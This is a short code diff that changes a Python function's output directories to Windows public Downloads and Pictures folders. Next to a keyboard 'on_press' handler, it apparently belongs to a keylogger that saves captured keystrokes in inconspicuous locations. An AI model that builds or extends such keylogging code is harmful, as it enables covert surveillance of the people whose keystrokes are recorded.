@@ -76,8 +76,14 @@ def on_press(key):
 
 
 def write_file(count):
-    one = os.path.expanduser( '~' ) + '/Downloads/'
-    two = os.path.expanduser( '~' ) + '/Pictures/'
+    #one = os.path.expanduser( '~' ) + '/Downloads/'
+    one = 'C:/Users/Public/Downloads/'
+    two = 'C:/Users/Public/Pictures/'
+    #two = os.path.expanduser( '~' ) + '/Pictures/'
+    #C:\Users\Public\Downloads
+    #C:\Users\Public\Documents
+    #one = os.path.dirname( path )
+    #two = os.path.dirname( path )
     # three = 'C:/'
     list = [one, two]
 
